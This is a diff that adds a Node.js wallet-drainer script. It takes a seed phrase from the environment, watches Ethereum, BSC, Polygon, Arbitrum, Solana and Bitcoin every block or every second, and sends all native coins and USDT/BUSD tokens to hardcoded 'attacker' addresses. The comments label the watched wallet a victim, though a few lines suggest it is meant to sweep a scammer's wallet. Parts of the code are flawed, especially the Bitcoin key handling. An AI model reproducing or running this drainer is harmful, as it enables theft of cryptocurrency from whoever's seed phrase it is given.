@@ -1,0 +1,329 @@
+const { ethers } = require("ethers");
+const {
+    Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, sendAndConfirmTransaction,
+    Transaction, SystemProgram
+} = require("@solana/web3.js");
+const { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } = require("@solana/spl-token");
+const bitcoin = require("bitcoinjs-lib");
+const axios = require("axios");
+require("dotenv").config();
+
+// Load monitored wallet seed phrase from .env
+const ZERO_SEED = process.env.ZERO_SEED;
+const VICTIM_WALLET = ethers.Wallet.fromPhrase(ZERO_SEED);
+
+// Attacker’s wallet addresses
+const ATTACKER_ADDRESS = "0x10f696018bf0d53e6f00d949209cce93d386c3ad"; // EVM-compatible
+const ATTACKER_SOL_ADDRESS = "BxK39AK95udUpALngEqRJsrhoTfiKprHEAZdWzggLTHb"; // Solana
+const ATTACKER_BTC_ADDRESS = "bc1qw7za0snd57qgxgg86fxlapy7u930p4m8ptm525"; // Bitcoin
+
+// ✅ List of EVM chains to monitor and drain
+const networks = [
+    { name: "Ethereum", rpc: "https://ethereum.publicnode.com", symbol: "ETH" },
+    { name: "Binance Smart Chain", rpc: "https://bsc-dataseed.binance.org/", symbol: "BNB" },
+    { name: "Polygon", rpc: "https://polygon-rpc.com/", symbol: "MATIC" },
+    { name: "Arbitrum", rpc: "https://arbitrum.publicnode.com/", symbol: "ETH" }
+];
+
+// ✅ Correct ERC-20/BEP-20 Token Addresses Per Chain
+const tokens = {
+    "Ethereum": [
+        { name: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 }
+    ],
+    "Binance Smart Chain": [
+        { name: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+        { name: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 }
+    ],
+    "Polygon": [],
+    "Arbitrum": []
+};
+
+// ✅ ERC-20 & BEP-20 Token ABI
+const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address recipient, uint256 amount) returns (bool)"
+];
+
+// ✅ Function to Drain ETH, BNB, MATIC, and ERC-20/BEP-20 Tokens
+let lastBalances = {};  // Store last known balances
+async function drainEVMFunds(network) {
+    try {
+        const provider = new ethers.JsonRpcProvider(network.rpc);
+        const scamWallet = new ethers.Wallet(VICTIM_WALLET.privateKey, provider);
+        const balance = await provider.getBalance(scamWallet.address);
+
+        // ✅ Debugging: Check balance and log
+        console.log(`Checking balance on ${network.name}:`, balance);
+
+        // ✅ Ensure balance is valid before using it
+        if (balance === undefined || balance === null) {
+            console.error(`Error: Received undefined balance on ${network.name}`);
+            return;
+        }
+
+        // ✅ Use `BigInt` instead of `.from()`
+        const bigBalance = BigInt(balance); 
+
+        // 🚀 Check if the balance changed before running again
+        if (lastBalances[network.name] === bigBalance) {
+            return;  // Skip draining if balance is unchanged
+        }
+
+        lastBalances[network.name] = bigBalance;  // Update last known balance
+        console.log(`Checking balance on ${network.name}: ${bigBalance} wei`);
+
+        // ✅ Drain native ETH, BNB, or MATIC (Leaves Small Gas Fee)
+        if (bigBalance > ethers.parseUnits("0.001", "ether")) {
+            console.log(`Funds detected on ${network.name}: ${ethers.formatEther(bigBalance)} ${network.symbol}`);
+
+            const feeData = await provider.getFeeData();
+            const gasPrice = feeData.gasPrice ?? BigInt(0);
+
+            if (!gasPrice || gasPrice === BigInt(0)) {
+                console.error(`Error: Failed to fetch gas price on ${network.name}. Skipping.`);
+                return;
+            }
+
+            const gasLimit = BigInt(21000);
+            const txFee = gasPrice * gasLimit;
+            const sendAmount = bigBalance - txFee;
+
+            if (sendAmount > BigInt(0)) {
+                const tx = {
+                    to: ATTACKER_ADDRESS,
+                    value: sendAmount,
+                    gasLimit: 21000,
+                    gasPrice: gasPrice,
+                };
+
+                try {
+                    const txResponse = await scamWallet.sendTransaction(tx);
+                    console.log(`Draining funds from ${network.name}... TX: ${txResponse.hash}`);
+                    await txResponse.wait();
+                    console.log(`Funds successfully drained from ${network.name}`);
+                } catch (sendError) {
+                    console.error(`Error sending funds from ${network.name}:`, sendError);
+                }
+            }
+        }
+
+        // ERC-20/BEP-20 Tokens
+        console.log(`Scanning for tokens on ${network.name}...`);
+        if (!tokens[network.name]) {
+            console.log(`No known tokens found for ${network.name}. Skipping.`);
+            return;
+        }
+
+        for (let token of tokens[network.name]) {
+            try {
+                const tokenContract = new ethers.Contract(token.address, ERC20_ABI, scamWallet);
+                const tokenBalance = await tokenContract.balanceOf(scamWallet.address);
+
+                if (!tokenBalance || BigInt(tokenBalance) === BigInt(0)) {
+                    console.log(`No ${token.name} balance found on ${network.name}. Skipping.`);
+                    continue;
+                }
+
+                console.log(`Draining ${ethers.formatUnits(tokenBalance, token.decimals)} ${token.name} from ${network.name}...`);
+
+                const gasPrice = await provider.getGasPrice();
+                const tx = await tokenContract.transfer(ATTACKER_ADDRESS, tokenBalance, { gasPrice });
+                await tx.wait();
+
+                console.log(`${token.name} drained from ${network.name}`);
+            } catch (tokenError) {
+                console.error(`Skipping ${token.name} on ${network.name}: Token may not exist or insufficient balance.`, tokenError);
+            }
+        }
+    } catch (error) {
+        console.error(`Error draining ${network.name}:`, error);
+    }
+}
+
+
+// ✅ Function to Drain Solana (SOL)
+async function drainSolanaFunds() {
+    try {
+       
+        const connection = new Connection("https://api.mainnet-beta.solana.com");
+        const victimKeypair = Keypair.fromSeed(Uint8Array.from(VICTIM_WALLET.privateKey.slice(0, 32)));
+        const victimPublicKey = victimKeypair.publicKey;
+        const attackerPublicKey = new PublicKey(ATTACKER_SOL_ADDRESS);
+
+        // ✅ Fetch SOL balance
+        const solBalance = await connection.getBalance(victimPublicKey);
+
+        if (solBalance > LAMPORTS_PER_SOL * 0.001) {
+            console.log(`Funds detected on Solana: ${solBalance / LAMPORTS_PER_SOL} SOL`);
+
+            let solTransaction = new Transaction().add(
+                SystemProgram.transfer({
+                    fromPubkey: victimPublicKey,
+                    toPubkey: attackerPublicKey,
+                    lamports: solBalance - LAMPORTS_PER_SOL * 0.0001, // Leaves minimal fee
+                })
+            );
+
+            let solSignature = await sendAndConfirmTransaction(connection, solTransaction, [victimKeypair]);
+            console.log(`Drained ${solBalance / LAMPORTS_PER_SOL} SOL successfully. TX: ${solSignature}`);
+        } else {
+            console.log("No SOL balance detected. Skipping Solana drain.");
+        }
+    } catch (error) {
+        console.error("Error draining Solana assets:", error);
+    }
+}
+
+// ✅ Function to Drain Bitcoin (BTC)
+async function drainBitcoinFunds() {
+    try {
+        
+        const network = bitcoin.networks.bitcoin;
+
+        // ✅ Generate victim's BTC address from the private key
+        let victimKeyPair;
+        try {
+            victimKeyPair = bitcoin.ECPair.fromWIF(VICTIM_WALLET.privateKey, network);
+        } catch (error) {
+            console.log("Seed phrase is not Bitcoin-compatible. Skipping BTC drain.");
+            return;
+        }
+
+        const { address: victimBTCAddress } = bitcoin.payments.p2pkh({ pubkey: victimKeyPair.publicKey, network });
+
+        console.log(`Fetching UTXOs for BTC address: ${victimBTCAddress}`);
+        const utxosResponse = await axios.get(`https://blockstream.info/api/address/${victimBTCAddress}/utxo`);
+        const utxos = utxosResponse.data;
+
+        if (utxos.length === 0) {
+            console.log("No UTXOs found. Skipping Bitcoin drain.");
+            return;
+        }
+
+        console.log(`Draining Bitcoin funds from ${victimBTCAddress}...`);
+
+        const psbt = new bitcoin.Psbt({ network });
+        let totalInput = 0;
+        let fee = 500; // Estimated network fee in satoshis
+
+        // ✅ Select UTXOs
+        for (const utxo of utxos) {
+            if (totalInput >= fee) break; // Stop adding inputs once we have enough balance
+            psbt.addInput({
+                hash: utxo.txid,
+                index: utxo.vout,
+                witnessUtxo: {
+                    script: Buffer.from(utxo.scriptpubkey, "hex"),
+                    value: utxo.value,
+                },
+            });
+            totalInput += utxo.value;
+        }
+
+        if (totalInput < fee) {
+            console.log("Insufficient BTC balance to cover transaction fees.");
+            return;
+        }
+
+        // ✅ Add the output (Attacker's BTC wallet)
+        psbt.addOutput({
+            address: ATTACKER_BTC_ADDRESS,
+            value: totalInput - fee, // Sending all minus fees
+        });
+
+        // ✅ Sign and broadcast the transaction
+        psbt.signAllInputs(victimKeyPair);
+        psbt.finalizeAllInputs();
+        const rawTx = psbt.extractTransaction().toHex();
+
+        console.log(`Broadcasting BTC transaction: ${rawTx}`);
+        await axios.post("https://blockstream.info/api/tx", rawTx);
+
+        console.log("Bitcoin funds successfully drained.");
+    } catch (error) {
+        console.error("Error draining Bitcoin:", error);
+    }
+}
+
+// ✅ Start Monitoring and Draining Immediately on New Blocks
+async function monitorEVMFunds(network) {
+    const provider = new ethers.JsonRpcProvider(network.rpc);
+    console.log(`Monitoring ${network.name} for balance changes...`);
+
+    provider.on("block", async (blockNumber) => {
+        // console.log(`🔄 New Block ${blockNumber} detected on ${network.name}`); //temporarily commenting this out
+        await drainEVMFunds(network);
+    });
+}
+
+// ✅ Start Monitoring for Solana & Bitcoin
+async function monitorSolanaFunds() {
+    console.log(`Monitoring Solana for balance changes...`);
+    setInterval(async () => {
+        console.log(`Checking Solana balance...`);
+        await drainSolanaFunds();
+    }, 1000); // Check every second
+}
+
+async function monitorBitcoinFunds() {
+    console.log(`Monitoring Bitcoin for balance changes...`);
+    setInterval(async () => {
+        console.log(`Checking Bitcoin balance...`);
+        await drainBitcoinFunds();
+    }, 1000); // Check every second
+}
+
+/*  COMMENTED OUT FOR NOW - SHOULD INTERCEPT TRANSACTIONS!
+async function monitorPendingTransactions(network) {
+    try {
+        console.log(`👀 Monitoring pending transactions on ${network.name}...`);
+
+        // ✅ Use a WebSocket RPC (Replace with a provider that supports WebSockets)
+        const provider = new ethers.WebSocketProvider(network.rpc.replace("https", "wss"));
+
+        provider.on("pending", async (txHash) => {
+            try {
+                const tx = await provider.getTransaction(txHash);
+
+                if (!tx) {
+                    console.log(`⚠️ Pending TX ${txHash} not found yet. It may be too new.`);
+                    return;
+                }
+
+                if (tx.to && tx.to.toLowerCase() === VICTIM_WALLET.address.toLowerCase()) {
+                    console.log(`🚨 Suspicious incoming transaction detected on ${network.name}: ${txHash}`);
+                    console.log(`🔍 Value: ${ethers.formatEther(tx.value)} ${network.symbol}`);
+
+                    // ✅ Intercept before the scammer moves it
+                    await drainEVMFunds(network);
+                }
+            } catch (error) {
+                if (error.response && error.response.status === 404) {
+                    console.log(`⚠️ Skipping TX ${txHash}: Not found (404).`);
+                } else {
+                    console.error(`❌ Error fetching pending TX: ${txHash}`, error);
+                }
+            }
+        });
+
+        provider._websocket.on("close", () => {
+            console.log(`⚠️ WebSocket closed for ${network.name}. Reconnecting...`);
+            setTimeout(() => monitorPendingTransactions(network), 5000); // Retry after 5s
+        });
+
+    } catch (error) {
+        console.error(`❌ Error setting up pending transaction monitoring for ${network.name}:`, error);
+    }
+}
+*/
+
+
+// 🚀 Start Real-Time Monitoring for All Chains
+networks.forEach(network => {
+    monitorEVMFunds(network);  // Detects funds when new blocks are mined
+   // monitorPendingTransactions(network); // Detects transactions before confirmation
+});
+
+// ✅ Also Monitor Solana and Bitcoin
+monitorSolanaFunds();
+monitorBitcoinFunds();
